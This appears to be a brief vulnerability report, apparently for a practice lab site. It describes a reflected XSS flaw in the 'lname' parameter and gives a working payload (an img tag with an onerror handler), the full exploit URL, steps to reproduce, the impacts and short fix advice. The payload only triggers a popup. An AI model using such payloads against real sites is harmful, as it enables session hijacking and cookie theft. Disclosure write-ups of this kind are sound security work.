# Reflected Cross-Site Scripting (XSS) via `lname` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `lname` parameter of the application. User-supplied input is reflected into the HTML response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text
http://kzlabs.com/punishment/11.php?fname=adsd&lname=%3CiMg+src%3Dx+onerror%3Dconfirm%28%22xicorrxss2%22%29%3E
```

---

## Vulnerable Parameter

```text
lname
```

---

## Payload Used

```html
<iMg src=x onerror=confirm("xicorrxss2")>
```

---

## Steps to Reproduce

1. Open the vulnerable URL:

   ```text
   http://kzlabs.com/punishment/11.php?fname=adsd&lname=%3CiMg+src%3Dx+onerror%3Dconfirm%28%22xicorrxss2%22%29%3E
   ```

2. Observe that the payload is reflected in the response.

3. The JavaScript executes automatically and triggers a popup.

---

## Proof of Concept

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/345c228b-2473-4bef-8490-90afe41d66f0" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
